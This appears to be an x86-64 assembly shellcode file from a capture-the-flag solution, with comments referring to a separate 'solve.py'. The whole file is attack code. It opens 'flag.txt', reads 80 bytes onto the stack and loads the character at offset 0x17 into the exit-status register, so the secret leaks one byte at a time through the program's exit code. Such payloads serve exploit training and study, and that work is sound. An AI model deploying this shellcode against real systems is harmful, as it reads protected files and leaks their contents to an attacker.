.intel_syntax noprefix
.global _start

# This shellcode leaks the flag character at offset 0x17
# as the exit status.
# (See "solve.py" for a full solution description)

_start:
    # call fd=open("flag.txt", O_RDONLY)
    mov dword ptr [rsp], 0x67616c66
    mov dword ptr [rsp+4], 0x7478742e
    mov qword ptr [rsp+8], 0x0
    mov rdi, rsp        # name
    mov rsi, 0x0        # O_RDONLY
    mov rax, 2          # sys_open
    syscall

    # call read(fd) (80 bytes, to the stack)
    mov rdi, rax        # fd
    mov rsi, rsp        # buf
    mov rdx, 80          # size
    mov rax, 0
    syscall

    # Exit value (to exit syscall) - with character from the flag
    # (specifically character in offest 0x17 - will be patched dynamically)
    mov rax, 0
    mov al, byte ptr [rsp+0x17]
    mov rdi, rax

    # Shellcode will proceed with exit syscall
